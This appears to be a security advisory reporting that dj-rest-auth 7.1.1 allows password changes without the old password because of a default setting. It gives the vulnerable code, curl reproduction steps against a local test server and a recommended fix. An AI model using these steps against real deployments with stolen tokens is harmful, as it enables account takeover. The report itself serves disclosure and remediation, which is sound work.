# Vuln-1: Password Change Without Old Password Verification

**Project:** dj-rest-auth (https://github.com/iMerica/dj-rest-auth)
**Version:** 7.1.1 (commit `c0c9c23`)
**Date:** 2026-03-14
**Severity:** HIGH
**CWE:** CWE-287 - Improper Authentication

---

## Affected Files

```text
dj_rest_auth/app_settings.py (line 27)
dj_rest_auth/serializers.py (lines 325-331)
```

## Root Cause

The `OLD_PASSWORD_FIELD_ENABLED` setting defaults to `False`. When this default is active, `PasswordChangeSerializer.__init__()` removes the `old_password` field entirely:

## Vulnerable Code

```python
# app_settings.py:27
'OLD_PASSWORD_FIELD_ENABLED': False,

# serializers.py:325-331
def __init__(self, *args, **kwargs):
    self.old_password_field_enabled = api_settings.OLD_PASSWORD_FIELD_ENABLED
    ...
    if not self.old_password_field_enabled:
        self.fields.pop('old_password')
```

This means any authenticated user can change their password by supplying only `new_password1` and `new_password2`, with no proof of knowledge of the current password.

## Exploitation Scenario

An attacker who obtains a valid session token (e.g., via XSS stealing a session cookie, or a leaked API token) can permanently take over the account by changing the password without knowing the original one.

**Prerequisites:** A valid authentication token (session cookie, Token, or JWT access token).

## Steps to Reproduce

```bash
# 1. Register a user and obtain a token
curl -s -X POST http://127.0.0.1:8000/api/auth/registration/ \
  -H 'Content-Type: application/json' \
  -d '{"username":"victim","email":"victim@test.com","password1":"OldPass123!","password2":"OldPass123!"}'

TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/auth/login/ \
  -H 'Content-Type: application/json' \
  -d '{"username":"victim","password":"OldPass123!"}' | python -c "import sys,json; print(json.load(sys.stdin)['key'])")

# 2. Change password WITHOUT providing old password
curl -s -X POST http://127.0.0.1:8000/api/auth/password/change/ \
  -H "Authorization: Token $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"new_password1":"Hacked999!","new_password2":"Hacked999!"}'
# Returns: {"detail":"New password has been saved."}

# 3. Verify old password no longer works
curl -s -X POST http://127.0.0.1:8000/api/auth/login/ \
  -H 'Content-Type: application/json' \
  -d '{"username":"victim","password":"OldPass123!"}'
# Returns: {"non_field_errors":["Unable to log in with provided credentials."]}

# 4. Verify new password works
curl -s -X POST http://127.0.0.1:8000/api/auth/login/ \
  -H 'Content-Type: application/json' \
  -d '{"username":"victim","password":"Hacked999!"}'
# Returns: {"key":"..."} (login successful)
```
![alt text](../dists/dj_rest_auth1.png)
## Impact

Full account takeover. An attacker with a stolen token can lock the legitimate user out of their account permanently. This is especially dangerous because password change is the one operation that should require re-authentication to prevent exactly this scenario.

## Recommended Fix

Set `OLD_PASSWORD_FIELD_ENABLED` to `True` by default:

```python
# app_settings.py
'OLD_PASSWORD_FIELD_ENABLED': True,
```

---

## References

- [OWASP A07:2021 - Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [dj-rest-auth source repository](https://github.com/iMerica/dj-rest-auth)
